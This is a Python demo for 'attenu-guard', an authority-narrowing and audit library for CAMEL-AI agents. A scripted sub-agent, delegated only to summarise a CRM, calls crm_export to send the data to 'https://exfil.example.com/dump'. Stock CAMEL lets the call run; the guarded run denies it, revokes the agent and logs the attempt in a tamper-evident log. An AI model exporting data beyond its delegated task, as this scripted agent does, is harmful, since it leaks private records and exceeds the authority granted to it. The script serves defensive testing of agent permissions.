"""attenu-guard x CAMEL-AI — the over-powered sub-agent story, offline.

    python examples/integrations/camel/demo.py

No API key needed: the LLM is a scripted `camel.models.BaseModelBackend` that
replays a fixed sequence of tool calls, so a real `ChatAgent.step(...)` loop
runs against real CAMEL code.

The story, in four acts:
  ACT 1  BASELINE  — stock CAMEL. The parent delegates "summarise the CRM" to a
                     sub-agent, and `AgentToolkit` builds that sub-agent from a
                     clone of the parent's WHOLE toolset. The sub-agent exports
                     the CRM. Nothing narrows it to its task.
  ACT 2  GUARDED   — the same run with attenu-guard wired in. The read is
                     allowed; the export is denied *before the tool body runs*.
  ACT 3  REVOKED   — the orchestrator revokes the sub-agent. Every further tool
                     call by it is denied.
  ACT 4  EVIDENCE  — the delegation graph and the hash-chained audit log.
"""
from __future__ import annotations

import json
import logging
import threading
from typing import Any, Dict, List

from camel.agents import ChatAgent
from camel.messages import OpenAIMessage
from camel.models import BaseModelBackend
from camel.toolkits import FunctionTool
from camel.toolkits.agent_toolkit import AgentToolkit
from camel.toolkits.base import BaseToolkit
from camel.types import ChatCompletion, ModelType
from camel.utils import BaseTokenCounter

from attenu_guard import (
    AuditLog,
    Authority,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.adapters.camel import (
    GuardedAgentToolkit,
    GuardRef,
    guard_toolkit,
)

# CAMEL logs every denied tool call at WARNING (chat_agent.py:4062). That is the
# right default in production and noise here, where the denial is the point and
# is printed below in full.
logging.getLogger("camel").setLevel(logging.ERROR)


# --------------------------------------------------------------------------
# Offline model: a scripted `BaseModelBackend`.
#
# One backend instance is shared by the parent and its sub-agent (CAMEL builds
# the child with `parent.model_backend.models`), and `agent_run_subagent` runs
# the child to completion before the parent's next turn, so a single ordered
# script is consumed deterministically. The lock is there because CAMEL runs
# the sub-agent on a worker thread (`AgentToolkit._executor`).
# --------------------------------------------------------------------------
class _Counter(BaseTokenCounter):
    def count_tokens_from_messages(self, messages: List[OpenAIMessage]) -> int:
        return 10

    def encode(self, text: str) -> List[int]:
        return [0] * (len(text) // 4 + 1)

    def decode(self, token_ids: List[int]) -> str:
        return "[scripted]"


class ScriptedModel(BaseModelBackend):
    """Replays `(tool_name, arguments)` pairs; `None` means "answer in text"."""

    model_type = ModelType.STUB

    def __init__(self, script):
        super().__init__(ModelType.STUB, {}, None, None, None)
        self.script = list(script)
        self.calls = 0
        self._lock = threading.Lock()

    @property
    def token_counter(self) -> BaseTokenCounter:
        if not self._token_counter:
            self._token_counter = _Counter()
        return self._token_counter

    def _next(self) -> ChatCompletion:
        with self._lock:
            step = self.script[self.calls] if self.calls < len(self.script) else None
            self.calls += 1
        message: Dict[str, Any] = {"role": "assistant", "content": ""}
        if step is None:
            message["content"] = "Done."
        else:
            name, arguments = step
            message["content"] = f"I will call {name}."
            message["tool_calls"] = [{
                "id": f"call_{self.calls}",
                "type": "function",
                "function": {"name": name, "arguments": json.dumps(arguments)},
            }]
        return ChatCompletion.model_validate({
            "id": "scripted", "model": "scripted", "object": "chat.completion",
            "created": 0,
            "choices": [{"finish_reason": "stop", "index": 0,
                         "message": message, "logprobs": None}],
            "usage": {"completion_tokens": 1, "prompt_tokens": 1,
                      "total_tokens": 2},
        })

    def _run(self, messages, response_format=None, tools=None) -> ChatCompletion:
        return self._next()

    async def _arun(self, messages, response_format=None,
                    tools=None) -> ChatCompletion:
        return self._next()


# --------------------------------------------------------------------------
# The tools. EFFECTS records what actually executed — the ground truth.
#
# CAMEL's toolkit naming principle: every public method of a toolkit carries the
# toolkit's own prefix, so `crm_query` / `crm_export`, never `query` / `export`.
# --------------------------------------------------------------------------
EFFECTS: List[tuple] = []


class CrmToolkit(BaseToolkit):
    r"""CRM access for the pipeline report."""

    def crm_query(self, rows: int) -> str:
        r"""Read rows from the CRM.

        Args:
            rows (int): How many CRM rows to read.

        Returns:
            str: A short summary of what was read.
        """
        EFFECTS.append(("crm_query", rows))
        return f"read {rows} CRM rows"

    def crm_export(self, destination: str) -> str:
        r"""Export the whole CRM to an external destination.

        Args:
            destination (str): Destination URL.

        Returns:
            str: A short confirmation.
        """
        EFFECTS.append(("crm_export", destination))          # <-- the breach
        return f"exported CRM to {destination}"

    def get_tools(self) -> List[FunctionTool]:
        return [FunctionTool(self.crm_query), FunctionTool(self.crm_export)]


ORCHESTRATOR = Authority(scopes={"crm.*", "mail.send"},
                         ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600)
SUMMARIZER = Authority(scopes={"crm.read"},
                       ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900)

CRM_SCOPES = {"crm_query": "crm.read", "crm_export": "crm.export"}
CONTEXT_FNS = {
    "crm_query": lambda rows: {"rows": rows},
    "crm_export": lambda destination: {"egress": "any"},
}

TASK = "Summarise the Q3 pipeline from the CRM."

# parent turn 1 -> delegate; sub-agent reads, then tries to exfiltrate, then
# answers; parent turn 2 -> answer.
SCRIPT = [
    ("agent_run_subagent", {"prompt": TASK, "description": "CRM summariser",
                            "subagent_type": "analysis"}),
    ("crm_query", {"rows": 4200}),
    ("crm_export", {"destination": "https://exfil.example.com/dump"}),
    None,
    None,
]


def rule(title: str) -> None:
    print(f"\n\033[1m{'=' * 72}\n{title}\n{'=' * 72}\033[0m")


def show_effects(label: str, effects: List[tuple]) -> None:
    print(f"  {label}: {effects if effects else '(nothing ran)'}")


# ==========================================================================
# ACT 1 — baseline: what CAMEL enforces on its own
# ==========================================================================
def act1_baseline() -> None:
    rule("ACT 1 — BASELINE: stock CAMEL, no authority narrowing")
    EFFECTS.clear()

    crm = CrmToolkit()
    toolkit = AgentToolkit()
    parent = ChatAgent(
        system_message="You orchestrate the Q3 board report.",
        model=ScriptedModel(SCRIPT),
        tools=[*crm.get_tools(), *toolkit.get_tools()],
        toolkits_to_register_agent=[toolkit],
    )

    print("  parent tools     : crm_query, crm_export, agent_run_subagent")
    print(f"  delegated task   : {TASK!r}")
    parent.step("Prepare the Q3 pipeline report.")

    sub = next(iter(toolkit._sessions.values())).agent
    print(f"  sub-agent tools  : {sorted(sub._internal_tools)}")
    show_effects("side effects", EFFECTS)
    print("\n  \033[31mThe sub-agent was asked to summarise, and it exported the CRM.\033[0m")
    print("  AgentToolkit._create_subagent (agent_toolkit.py:161) builds the child")
    print("  from ChatAgent._clone_tools() (chat_agent.py:6183) — a copy of the")
    print("  parent's whole toolset. The task is narrow; the authority is not.")


# ==========================================================================
# ACTS 2-4 — the same run, guarded
# ==========================================================================
def acts_2_to_4() -> None:
    rule("ACT 2 — GUARDED: attenu-guard at both hook points")
    EFFECTS.clear()

    root = Guard.issue("orchestrator", ORCHESTRATOR, task="Q3 board report")
    parent_ref = GuardRef(root)
    crm = CrmToolkit()

    def child_tools(ref: GuardRef):
        """Built fresh per delegation, bound to that handoff's child Guard."""
        return guard_toolkit(ref, CrmToolkit(), CRM_SCOPES, context_fns=CONTEXT_FNS)

    toolkit = GuardedAgentToolkit(
        parent_guard=root, authority=SUMMARIZER, child_tools=child_tools,
        agent_id_prefix="summarizer")
    parent = ChatAgent(
        system_message="You orchestrate the Q3 board report.",
        model=ScriptedModel(SCRIPT),
        tools=[*guard_toolkit(parent_ref, crm, CRM_SCOPES, context_fns=CONTEXT_FNS),
               *toolkit.get_tools()],
        toolkits_to_register_agent=[toolkit],
    )

    print(f"  orchestrator authority : {ORCHESTRATOR}")
    print(f"  summarizer  requested  : {SUMMARIZER}")

    parent.step("Prepare the Q3 pipeline report.")

    child = toolkit.child_guards[-1]
    print(f"  summarizer  GRANTED    : {child.authority}")
    print(f"  child.is_narrower_than(parent) -> {child.is_narrower_than(root)}")
    print()
    show_effects("side effects", EFFECTS)
    ran = [e[0] for e in EFFECTS]
    print(f"\n  crm_query  (crm.read,  4200 rows)   -> \033[32mALLOWED\033[0m "
          f"{'(body ran)' if 'crm_query' in ran else ''}")
    print(f"  crm_export (crm.export, egress any) -> \033[32mDENIED\033[0m  "
          f"{'(body never ran)' if 'crm_export' not in ran else '(LEAKED!)'}")

    # ---- greedy request is met down, not granted -------------------------
    print("\n  A greedy delegation request is met down to the parent's ceiling,")
    print("  never granted as asked:")
    greedy = GuardedAgentToolkit(
        parent_guard=root, child_tools=child_tools, agent_id_prefix="greedy",
        authority=Authority(scopes={"crm.*", "s3.write", "iam.admin"},
                            ceilings=[RowLimit(10_000_000)], ttl=86_400))
    g = greedy.mint("greedy:analysis", "give me everything")
    print("    requested scopes  : {'crm.*', 's3.write', 'iam.admin'}, "
          "RowLimit(10_000_000), ttl=86400")
    print(f"    granted  scopes   : {set(g.authority.scopes)}")
    print(f"    granted  max_rows : {g.authority.ceiling('max_rows').max_rows:,}"
          f"  (parent's ceiling)")
    print(f"    granted  ttl      : {g.authority.ttl}  (parent's ttl)")
    print(f"    is_narrower_than(parent) -> {g.is_narrower_than(root)}")

    # ---- ACT 3: revocation ----------------------------------------------
    rule("ACT 3 — REVOKED: cascade revocation stops every later tool call")
    revoked_nodes = root.revoke(child.node_id)
    print(f"  root.revoke({child.node_id!r}) -> revoked {len(revoked_nodes)} node(s)")

    sub_id = next(iter(toolkit._guard_refs))
    sub = toolkit._sessions[sub_id].agent
    sub.model_backend.models[0].script = [("crm_query", {"rows": 10}), None]
    sub.model_backend.models[0].calls = 0
    before = len(EFFECTS)
    sub.step("Just one more tiny read, please.")
    print(f"  a further crm_query(rows=10) by the revoked sub-agent -> "
          f"\033[32m{'DENIED (body never ran)' if len(EFFECTS) == before else 'LEAKED!'}\033[0m")

    # ---- ACT 4: evidence -------------------------------------------------
    rule("ACT 4 — EVIDENCE: delegation graph + tamper-evident audit log")
    graph = root.graph()
    print(f"  chain {graph['chain_id']}")
    for node in graph["nodes"]:
        mark = "revoked" if node["revoked"] else "active"
        indent = "    " + "  " * node["depth"]
        arrow = "" if node["parent"] is None else "└─ "
        print(f"{indent}{arrow}{node['agent']}  [{node['id']}]  ({mark})")
        print(f"{indent}   task: {node['task']}")

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    print(f"\n  audit entries: {len(entries)}    AuditLog.verify -> {ok}"
          f"{'' if ok else f' ({err})'}")
    print("  " + "-" * 68)
    for e in entries:
        line = f"  seq {e['seq']:>2}  {e['event']:<12}"
        if e["event"] in ("allow", "deny"):
            line += f" scope={e['scope']:<12} tool={str(e['tool']):<11}"
            if e["event"] == "deny":
                line += f" reason={e['reason']}"
        elif e["event"] in ("spawn", "root"):
            line += f" agent={e['agent']}"
        elif e["event"] == "kill":
            line += f" target={e['target']}"
        print(line)

    # Someone tries to rewrite history to hide the attempted exfiltration.
    tampered = [dict(e) for e in entries]
    breach = next(i for i, e in enumerate(tampered)
                  if e["event"] == "deny" and e["scope"] == "crm.export")
    tampered[breach]["event"] = "allow"
    ok2, err2 = AuditLog.verify(tampered)
    print(f"\n  rewrite seq {breach} ('deny crm.export' -> 'allow') to hide the breach:")
    print(f"    AuditLog.verify -> {ok2} ({err2})")


if __name__ == "__main__":
    act1_baseline()
    acts_2_to_4()
    print("\n\033[1mBoth hook points, one adapter module, zero changes to CAMEL "
          "or to attenu-guard.\033[0m\n")
